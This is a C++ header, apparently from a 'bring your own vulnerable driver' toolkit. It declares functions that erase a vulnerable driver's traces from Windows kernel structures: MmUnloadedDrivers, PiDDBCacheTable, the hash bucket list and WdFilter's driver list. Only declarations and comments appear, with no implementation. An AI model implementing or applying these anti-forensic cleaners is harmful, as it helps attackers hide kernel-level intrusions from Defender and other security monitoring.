#pragma once
#include <windows.h>
#include <string>
#include <cstdint>
#include <vector>

#include "hinv_byovd.hpp"

namespace hinv {
namespace cleaner {

struct CleanResult {
    // Not post-hoc cleanable on current builds (layout is build-dependent and
    // the array is written at unload time). Handled instead by
    // PreventUnloadedDriverTrace in the backend's unload path.
    bool mmUnloadedDrivers = false;
    bool piDdbCache = false;
    bool hashBucketList = false;
    bool wdFilter = false;
    std::wstring error;
};

// Remove traces of a loaded driver from kernel bookkeeping structures.
// driverFileTimestamp is the TimeDateStamp of the vulnerable driver's PE
// header (needed for the PiDDBCacheTable AVL lookup).
CleanResult CleanDriverTraces(byovd::IByovdBackend* backend, const std::wstring& driverName,
                              uint32_t driverFileTimestamp);

// Read the TimeDateStamp from a driver file's PE header on disk. 0 on failure.
uint32_t GetDriverFileTimestamp(const std::wstring& driverPath);

// Zero the driver name in the vulnerable driver's own KLDR_DATA_TABLE_ENTRY so
// MiRememberUnloadedDriver skips it at unload time (kdmapper approach). Must be
// called while the driver is still loaded and the device handle is open; the
// backend calls this from its Shutdown before stopping the service.
bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHandle);

// Direct helpers exposed for scripting.
bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName);
bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName, uint32_t driverFileTimestamp);
bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring& driverName);
bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& driverName);

} // namespace cleaner
} // namespace hinv
